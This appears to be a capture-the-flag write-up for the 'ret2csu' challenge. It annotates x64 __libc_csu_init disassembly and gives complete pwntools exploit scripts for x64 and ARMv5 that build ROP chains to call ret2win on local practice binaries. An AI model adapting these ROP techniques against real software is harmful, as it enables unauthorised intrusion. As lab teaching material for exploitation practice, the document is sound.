## x64

---

- `ret2csu` is a method of controlling `rsi` and `rdx` whenever a binary is lacking gadgets by jumping into `__lib_csu_init()`
- It's a little ugly though, and requires we add dummies to our stack and ensure that we play with some values to follow more logic of the function

```d
void __libc_csu_init()

4157               push    r15 {__saved_r15}
4156               push    r14 {__saved_r14}
4989d7             mov     r15, rdx
4155               push    r13 {__saved_r13}
4154               push    r12 {__saved_r12}
4c8d259e072000     lea     r12, [rel __frame_dummy_init_array_entry]
55                 push    rbp {__saved_rbp}
488d2d9e072000     lea     rbp, [rel __do_global_dtors_aux_fini_array_entry]
53                 push    rbx {__saved_rbx}
4189fd             mov     r13d, edi
4989f6             mov     r14, rsi
4c29e5             sub     rbp, r12
4883ec08           sub     rsp, 0x8
48c1fd03           sar     rbp, 0x3  {0x1}
e85ffeffff         call    _init
4885ed             test    rbp, rbp
7420               je      0x400696  {0x0}

31db               xor     ebx, ebx  {0x0}
0f1f840000000000   nop     dword [rax+rax]

4c89fa             mov     rdx, r15 // this is what we need
4c89f6             mov     rsi, r14
4489ef             mov     edi, r13d
41ff14dc           call    qword [r12+rbx*8] // rbx = 0 would be nice here
4883c301           add     rbx, 0x1
4839dd             cmp     rbp, rbx // rbp must then be 1 if rbx is 0
75ea               jne     0x400680

4883c408           add     rsp, 0x8
5b                 pop     rbx {__saved_rbx}
5d                 pop     rbp {__saved_rbp}
415c               pop     r12 {__saved_r12}
415d               pop     r13 {__saved_r13}
415e               pop     r14 {__saved_r14}
415f               pop     r15 {__saved_r15}
c3                 retn     {__return_addr}
```

### solve

```python
#!/usr/bin/env python3

from pwn import *

exe = "./ret2csu"
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

pop_rbx_rbp_r12_r13_r14_r15 = 0x40069A
mov_rdx_r15_etc = 0x400680
pop_rdi = 0x4006A3
pop_rsi_r15 = 0x4006A1
dyn_fini_ptr = 0x600E48  # pointer to fini() -> add rsp, 8; sub rsp, 8; ret

rop = ROP(exe)
rop.raw(pop_rbx_rbp_r12_r13_r14_r15)
rop.raw(0)  # rbx = 0
rop.raw(1)  # rbp, so rbx == rbp (after inc) and the jne isnt taken
rop.raw(dyn_fini_ptr)  # r12, will be called in [r12 + rbx*8] = [r12]
rop.raw(0)  # r13, unimportant
rop.raw(0)  # r14, unimportant
rop.raw(0xD00DF00DD00DF00D)  # r15, our desired rdx value!

rop.raw(mov_rdx_r15_etc)
rop.raw(0)  # padding for the add rsp, 8
rop.raw(0)  # rbx
rop.raw(0)  # rbp
rop.raw(0)  # r12
rop.raw(0)  # r13
rop.raw(0)  # r14
rop.raw(0)  # r15

rop.raw(pop_rdi)
rop.raw(0xDEADBEEFDEADBEEF)
rop.raw(pop_rsi_r15)
rop.raw(0xCAFEBABECAFEBABE)
rop.raw(0)

rop.raw(elf.sym.ret2win)

offset = 40
payload = flat({offset: rop.chain()})

context.log_level = "debug"
# io = gdb.debug(exe, "b pwnme\nc")
io = process(exe)
io.sendafter(b"> ", payload)
io.interactive()
```

## ARMv5

---

```python
#!/usr/bin/puthon3
from pwn import process, p32, log

shell = process("./ret2csu_armv5")

offset = 36
junk = b"A" * offset

payload  = b""
payload += junk
payload += p32(0x10474)    # pop {r3, pc};
payload += p32(0x10498)    # ret2win()
payload += p32(0x10644)    # pop {r4, r5, r6, r7, r8, sb, sl, pc}
payload += p32(0x0) * 3    # padding for pops
payload += p32(0xdeadbeef) # arg1
payload += p32(0xcafebabe) # arg2
payload += p32(0xd00df00d) # arg3
payload += p32(0x0)        # padding for pop
payload += p32(0x1062c)    # mov r2, sb; mov r1, r8; mov r0, r7; blx r3;

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
```
